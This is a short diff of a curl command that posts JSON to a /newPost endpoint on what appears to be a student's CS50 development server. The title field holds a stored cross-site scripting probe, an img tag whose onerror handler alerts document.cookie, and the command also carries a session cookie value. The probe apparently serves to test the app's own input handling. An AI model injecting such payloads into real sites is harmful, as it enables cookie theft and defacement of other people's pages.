@@ -1,8 +1,8 @@
 curl --request POST \
-  --url https://19e9b6c3-0dbf-4032-8599-015610d884f7-ide.cs50.xyz/newPost \
+  --url https://eb0a8b93-1cad-4d99-912c-1520b893de69-ide.cs50.xyz/newPost \
   --header 'content-type: application/json' \
-  --cookie connect.sid=s%253APyd-lOqGhpD8pHvB80-l1jAzN_YbIuJP.2sGj3NTqEFJi4cLvzADX5GYhW2Ta9EAtqLEhMf8l60s \
+  --cookie connect.sid=s%253ASf42W_9EDPijGdjWK2CM8Gzf1cYGbEI2.8WhQJW%252Blts3qGn4zftfrKTkqZ0SlbzT0%252FHbZuJryJsw \
   --data '{
-	"title":" <img src = '\''lol'\'' onerror = '\''alert(document.cookie)'\'' />",
-	"body":"webpage hacked unfortunately!"
+	"title": "< img src='\''lols'\'' onerror='\''alert(document.cookie);'\'' />",
+	"content": "lololol"
 }'
